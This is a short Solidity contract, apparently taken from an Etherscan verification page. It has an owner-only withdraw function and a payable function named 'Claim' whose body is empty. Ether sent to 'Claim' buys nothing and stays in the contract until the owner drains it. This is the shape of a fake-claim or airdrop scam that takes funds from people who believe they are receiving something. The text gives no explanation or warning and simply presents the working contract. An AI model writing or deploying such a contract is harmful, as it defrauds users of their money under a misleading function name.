/**
 *Submitted for verification at Etherscan.io on 2023-05-04
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.17;

contract SmartContract {

    address private  owner;

    constructor() {
    owner = msg.sender;
    }

    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public payable {
        require(owner == msg.sender);
        payable(owner).transfer(address(this).balance);
    }

    function Claim() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}